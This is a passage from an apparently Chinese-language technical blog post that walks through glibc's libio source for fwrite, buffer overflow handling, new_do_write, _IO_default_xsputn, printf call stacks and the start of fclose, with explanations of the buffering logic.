*/</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First figure out how much space is available in the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;</span><br><span class="line">      <span class="keyword">if</span> (count &gt;= n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *p;</span><br><span class="line">  <span class="keyword">for</span> (p = s + n; p &gt; s; )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (*--p == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  count = p - s + <span class="number">1</span>;</span><br><span class="line">  must_flush = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="comment">/* Space available. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Then fill the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; to_do)</span><br><span class="line">count = to_do;</span><br><span class="line">      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">      s += count;</span><br><span class="line">      to_do -= count;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (to_do + must_flush &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> block_size, do_write;</span><br><span class="line">      <span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)</span><br><span class="line"><span class="comment">/* If nothing else has to be written we must not signal the</span></span><br><span class="line"><span class="comment">   caller that everything has been written.  */</span></span><br><span class="line"><span class="keyword">return</span> to_do == <span class="number">0</span> ? EOF : n - to_do;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Try to maintain alignment: write a whole number of blocks.  */</span></span><br><span class="line">      block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;</span><br><span class="line">      do_write = to_do - (block_size &gt;= <span class="number">128</span> ? to_do % block_size : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_write)</span><br><span class="line">&#123;</span><br><span class="line">  count = new_do_write (f, s, do_write);</span><br><span class="line">  to_do -= count;</span><br><span class="line">  <span class="keyword">if</span> (count &lt; do_write)</span><br><span class="line">    <span class="keyword">return</span> n - to_do;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Now write out the remainder.  Normally, this will fit in the</span></span><br><span class="line"><span class="comment"> buffer, but it&#x27;s somewhat messier for line-buffered files,</span></span><br><span class="line"><span class="comment"> so we let _IO_default_xsputn handle the general case. */</span></span><br><span class="line">      <span class="keyword">if</span> (to_do)</span><br><span class="line">to_do -= _IO_default_xsputn (f, s+do_write, to_do);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - to_do;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到整体逻辑与fread几乎是一致的</p><h2 id="0x1-2"><a href="#0x1-2" class="headerlink" title="0x1"></a>0x1</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">   &#123;</span><br><span class="line">     count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;</span><br><span class="line">     <span class="keyword">if</span> (count &gt;= n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *p;</span><br><span class="line">  <span class="keyword">for</span> (p = s + n; p &gt; s; )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (*--p == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  count = p - s + <span class="number">1</span>;</span><br><span class="line">  must_flush = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">   &#125;</span><br><span class="line"> <span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">   count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="comment">/* Space available. */</span></span><br></pre></td></tr></table></figure><p>如果文件流属于行缓冲模式</p><p>则倒序搜索数据串中是否存在’\n’</p><p>存在则设置count和must_flush标志</p><p>如果不处于行缓冲模式则根据缓冲区中是否有数据设置count</p><h2 id="0x2-2"><a href="#0x2-2" class="headerlink" title="0x2"></a>0x2</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">if</span> (count &gt; to_do)</span><br><span class="line">count = to_do;</span><br><span class="line">     f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">     s += count;</span><br><span class="line">     to_do -= count;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>如果count&gt;0就先将已有的部分传递给文件流</p><h2 id="0x3-2"><a href="#0x3-2" class="headerlink" title="0x3"></a>0x3</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> (to_do + must_flush &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> block_size, do_write;</span><br><span class="line">      <span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)</span><br><span class="line"><span class="comment">/* If nothing else has to be written we must not signal the</span></span><br><span class="line"><span class="comment">   caller that everything has been written.  */</span></span><br><span class="line"><span class="keyword">return</span> to_do == <span class="number">0</span> ? EOF : n - to_do;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Try to maintain alignment: write a whole number of blocks.  */</span></span><br><span class="line">      block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;</span><br><span class="line">      do_write = to_do - (block_size &gt;= <span class="number">128</span> ? to_do % block_size : <span class="number">0</span>);</span><br><span class="line"><span class="comment">//清空缓冲区</span></span><br><span class="line">      <span class="keyword">if</span> (do_write)</span><br><span class="line">&#123;</span><br><span class="line">  count = new_do_write (f, s, do_write);</span><br><span class="line">  to_do -= count;</span><br><span class="line">  <span class="keyword">if</span> (count &lt; do_write)</span><br><span class="line">    <span class="keyword">return</span> n - to_do;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Now write out the remainder.  Normally, this will fit in the</span></span><br><span class="line"><span class="comment"> buffer, but it&#x27;s somewhat messier for line-buffered files,</span></span><br><span class="line"><span class="comment"> so we let _IO_default_xsputn handle the general case. */</span></span><br><span class="line">      <span class="keyword">if</span> (to_do)</span><br><span class="line">to_do -= _IO_default_xsputn (f, s+do_write, to_do);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>如果 todo 还有剩余（即剩余空间不够）或 must_flush 被置为 1 的情况（即上面有 flush 的情况），需要做如下的处理：</p><ul><li>先调用_IO_OVERFLOW 将前面写满的 buffer 写入物理文件中，如果此时写入失败的话，那就需要做处理，如果 to_do == 0，即本次要写入的东西都写到缓冲 buffer 里面了，所以是写入失败的，需要返回 EOF，否则，说明 n - todo 字节的 buffer 被写入缓冲了。</li><li>计算当前文件流对象的 buffer 大小 block_size(即_IO_buf_end-_IO_buf_base)，如果 block_size 大于 128，则计算剩余未写入字节的余数 to_do % block_size，否则置为 0，计算 do_write 为剩余字节数减去上面计算处出的对齐余数。所以作用是将剩余的未写入字节数规整为 m*block_size + 剩余未满 block_size 字节的部分。</li><li>调用 new_do_write 写入上面计算出的一整块数据（这些数据大小是 m 个 buffer 缓冲区大小），注意，这里返回的实际写入字节数 count 如果小于我们前面计算的 do_write 大小，那就直接返回已写入的字节数 n - to_do（说明有写入失败的情况存在）。</li><li>最后，如果还有字节没有写入，那就需要调用_IO_default_xsputn 进行剩余字节的写入。</li><li>最后的返回信息仍然是 n - to_do 字节</li></ul><h3 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h3><p>先看_IO_OVERFLOW (f, EOF) </p><p>其调用__overflow</p><p>代码位于libio/genops.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_overflow (FILE *f, <span class="type">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;<span class="comment">//文件不允许写入</span></span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_doallocbuf (f);</span><br><span class="line">  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">&#125;</span><br><span class="line">      <span class="comment">/* Otherwise must be currently reading.</span></span><br><span class="line"><span class="comment"> If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment"> logically slide the buffer forwards one block (by setting the</span></span><br><span class="line"><span class="comment"> read pointers to all point at the beginning of the block).  This</span></span><br><span class="line"><span class="comment"> makes room for subsequent output.</span></span><br><span class="line"><span class="comment"> Otherwise, set the read pointers to _IO_read_end (leaving that</span></span><br><span class="line"><span class="comment"> alone, so it can continue to correspond to the external position). */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">  _IO_free_backup_area (f);</span><br><span class="line">  f-&gt;_IO_read_base -= MIN (nbackup,f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">  f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">  f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;<span class="comment">//切换为写入模式</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">  f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line"> f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">/* Buffer is really full */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  *f-&gt;_IO_write_ptr++ = ch;</span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">      f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">char</span>) ch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其又调用_IO_do_write</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span></span><br><span class="line">_IO_new_file_write (FILE *f, <span class="type">const</span> <span class="type">void</span> *data, <span class="type">ssize_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> to_do = n;</span><br><span class="line">  <span class="keyword">while</span> (to_do &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">ssize_t</span> count = (__builtin_expect (f-&gt;_flags2</span><br><span class="line">                                         &amp; _IO_FLAGS2_NOTCANCEL, <span class="number">0</span>)</span><br><span class="line">   ? __write_nocancel (f-&gt;_fileno, data, to_do)</span><br><span class="line">   : __write (f-&gt;_fileno, data, to_do));</span><br><span class="line">      <span class="keyword">if</span> (count &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">  f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">      to_do -= count;</span><br><span class="line">      data = (<span class="type">void</span> *) ((<span class="type">char</span> *) data + count);<span class="comment">//write_base后移</span></span><br><span class="line">    &#125;</span><br><span class="line">  n -= to_do;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_offset &gt;= <span class="number">0</span>)</span><br><span class="line">    f-&gt;_offset += n;</span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果buf全满了</p><p>又会使用_IO_do_flush,相当于调用_IO_do_write</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_do_flush(_f) \</span></span><br><span class="line"><span class="meta">  ((_f)-&gt;_mode &lt;= 0      \</span></span><br><span class="line"><span class="meta">   ? _IO_do_write(_f, (_f)-&gt;_IO_write_base,      \</span></span><br><span class="line"><span class="meta">  (_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base)      \</span></span><br><span class="line"><span class="meta">   : _IO_wdo_write(_f, (_f)-&gt;_wide_data-&gt;_IO_write_base,      \</span></span><br><span class="line"><span class="meta">   ((_f)-&gt;_wide_data-&gt;_IO_write_ptr      \</span></span><br><span class="line"><span class="meta">    - (_f)-&gt;_wide_data-&gt;_IO_write_base)))</span></span><br></pre></td></tr></table></figure><h3 id="0x31"><a href="#0x31" class="headerlink" title="0x31"></a>0x31</h3><p>new_do_write</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">size_t</span></span><br><span class="line"><span class="title function_">new_do_write</span> <span class="params">(FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, <span class="type">size_t</span> to_do)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">off64_t</span> new_pos</span><br><span class="line">= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x4-IO-default-xsputn"><a href="#0x4-IO-default-xsputn" class="headerlink" title="0x4_IO_default_xsputn"></a>0x4_IO_default_xsputn</h2><ul><li><p>处理局部变量赋值，同时考虑写入 size 小于等于 0 的情况，直接返回 0</p></li><li><p>开始循环处理 data 数据</p><p>如果还有剩余缓存空间，计算剩余缓存空间数量 count</p><p>如果缓存空间比要写入的字节数量多，那就更新 count 为需要写入字节数；</p><p>如果需要写入字节数大于 20，那就调用__mempcpy 写入</p><p>否则就使用循环赋值的方式进行赋值（<strong>注意这里就是 Glibc 的精髓所在了，正常我们写代码可能就考虑循环赋值或者 memcpy 解决这个问题了，但是这里区分了情况，应该是考虑到了两者的性能差，为了达到最优情况，使用了分段处理的方式</strong>）</p></li><li><p>循环结束条件是剩余写入字符为 0，或调用_IO_OVERFLOW 写入 buffer 的同时写入下一个字符成功</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_default_xsputn (FILE *f, <span class="type">const</span> <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s = (<span class="type">char</span> *) data;</span><br><span class="line">  <span class="type">size_t</span> more = n;</span><br><span class="line">  <span class="keyword">if</span> (more &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Space available. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_ptr &lt; f-&gt;_IO_write_end)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; more)</span><br><span class="line">        count = more;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; <span class="number">20</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">          s += count;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (count)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="type">char</span> *p = f-&gt;_IO_write_ptr;</span><br><span class="line">          <span class="type">ssize_t</span> i;</span><br><span class="line">          <span class="keyword">for</span> (i = count; --i &gt;= <span class="number">0</span>; )</span><br><span class="line">        *p++ = *s++;</span><br><span class="line">          f-&gt;_IO_write_ptr = p;</span><br><span class="line">        &#125;</span><br><span class="line">      more -= count;</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="keyword">if</span> (more == <span class="number">0</span> || _IO_OVERFLOW (f, (<span class="type">unsigned</span> <span class="type">char</span>) *s++) == EOF)</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">      more--;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - more;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_default_xsputn)</span><br></pre></td></tr></table></figure><h2 id="printf"><a href="#printf" class="headerlink" title="printf"></a>printf</h2><p>调用栈</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">► f 0   0x7f6117fd43b0 write</span><br><span class="line">  f 1   0x7f6117f55c0f _IO_file_write+143</span><br><span class="line">  f 2   0x7f6117f5639a _IO_file_xsputn+426</span><br><span class="line">  f 3   0x7f6117f2cfa4 buffered_vfprintf+308</span><br><span class="line">  f 4   0x7f6117f2a33d vfprintf+445</span><br><span class="line">  f 5   0x7f6117f328a9 printf+153</span><br></pre></td></tr></table></figure><h2 id="puts"><a href="#puts" class="headerlink" title="puts"></a>puts</h2><p>调用栈与fwrite大致相同</p><h1 id="fclose"><a href="#fclose" class="headerlink" title="fclose"></a>fclose</h1><p>fclose实际上是_IO_new_fclose,位于libcio/iofclose.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_fclose (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line"></span><br><span class="line">  CHECK_FILE(fp, EOF);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)</span></span><br><span class="line">  <span class="comment">/* We desperately try to help programs which are using streams in a</span></span><br><span class="line"><span class="comment">     strange way and mix old and new functions.  Detect old streams</span></span><br><span class="line"><span class="comment">     here.  */</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> _IO_old_fclose (fp);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First unlink the stream.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    _IO_un_link ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);</span><br><span class="line"></span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; 